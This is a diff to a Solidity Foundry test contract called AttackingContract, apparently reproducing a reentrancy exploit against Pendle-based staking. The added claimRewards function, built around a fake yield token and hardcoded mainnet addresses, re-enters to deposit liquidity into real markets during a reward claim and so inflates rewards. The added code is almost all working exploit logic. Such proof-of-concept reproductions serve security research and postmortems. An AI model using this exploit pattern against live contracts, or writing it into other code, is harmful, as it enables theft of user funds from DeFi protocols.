@@ -29,6 +29,112 @@ contract AttackingContract is Test {
         balanceOf[to] += amount;
     }
 
+    function assetInfo() external view returns(uint8, address, uint8) {
+        return (0, address(this), 8);
+    }
+
+    function exchangeRate() external view returns (uint256 res) {
+        return 1 ether;
+    }
+
+    function rewardIndexesCurrent() external returns (uint256[] memory) { }
+
+    function getRewardTokens() external view returns (address[] memory) {
+        if (0x5b6c23aedf704D19d6D8e921E638e8AE03cDCa82 == msg.sender) {
+            address[] memory tokens = new address[](2);
+            tokens[0] = 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe;
+            tokens[1] = 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6;
+            return tokens;
+        }
+    }
+
+    uint256 claimRewardsCall;
+    uint256 netLpOut_fromRouter;
+    function claimRewards(address user) external returns (uint256[] memory rewardAmounts) {
+        if (claimRewardsCall == 0) {
+            claimRewardsCall++;
+            return new uint256[](0);
+        }
+
+        address agETH = 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e;
+        address pendleAgEthSy = 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe;
+
+        address rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
+        address pendleRswEthSy = 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6;
+
+        address pendleRouterV4 = 0x888888888889758F76e7103c6CbF23ABbF58F946;
+
+        if (claimRewardsCall == 1) {
+            // Approves PendleRouterV4 contract to move its whole agETH balance
+            IERC20(agETH).approve(pendleRouterV4, type(uint256).max);
+            uint256 agETH_balance = IERC20(agETH).balanceOf(address(this));
+
+            {
+                PendleRouterV4.SwapData memory swapData = PendleRouterV4.SwapData(
+                    PendleRouterV4.SwapType.NONE,
+                    address(0),
+                    "",
+                    false
+                );
+                PendleRouterV4.TokenInput memory input = PendleRouterV4.TokenInput(
+                    agETH,
+                    agETH_balance,
+                    agETH,
+                    address(0),
+                    swapData
+                );
+                PendleRouterV4(pendleRouterV4).addLiquiditySingleTokenKeepYt(
+                    address(this),
+                    pendleAgEthSy,
+                    1,
+                    1,
+                    input
+                );
+            }
+
+            // Approves PendleStaking contract to move its whole agETH SY balance
+            uint256 pendleAgEthSy_balance = IERC20(pendleAgEthSy).balanceOf(address(this));
+            IERC20(pendleAgEthSy).approve(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, pendleAgEthSy_balance);
+            // and deposits it all into the real Pendle agETH Market
+            PendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4).depositMarket(pendleAgEthSy, pendleAgEthSy_balance);
+
+
+
+            // Approves PendleRouterV4 contract to move its whole rswETH balance
+            IERC20(rswETH).approve(pendleRouterV4, type(uint256).max);
+            uint256 pendleRswETH_balance = IERC20(rswETH).balanceOf(address(this));
+
+            {
+                PendleRouterV4.SwapData memory swapData = PendleRouterV4.SwapData(
+                    PendleRouterV4.SwapType.NONE,
+                    address(0),
+                    "",
+                    false
+                );
+                PendleRouterV4.TokenInput memory input = PendleRouterV4.TokenInput(
+                    rswETH,
+                    pendleRswETH_balance,
+                    rswETH,
+                    address(0),
+                    swapData
+                );
+                (netLpOut_fromRouter,,,) = PendleRouterV4(pendleRouterV4).addLiquiditySingleTokenKeepYt(
+                    address(this),
+                    pendleRswEthSy,
+                    1,
+                    1,
+                    input
+                );
+            }
+
+            // Approves PendleStaking contract to move its whole rswETH SY balance
+            uint256 pendleRswEthSy_balance = IERC20(pendleRswEthSy).balanceOf(address(this));
+            IERC20(pendleRswEthSy).approve(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, pendleRswEthSy_balance);
+            // and deposits it all into the real Pendle rswETH Market
+            PendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4).depositMarket(pendleRswEthSy, pendleRswEthSy_balance);
+        }
+    }
+
     function test_createEvilPendleMarket() external {
         // Exploiter creates a Principal Token and a Yield Token on Pendle
         // using his evil Standard Yield token.
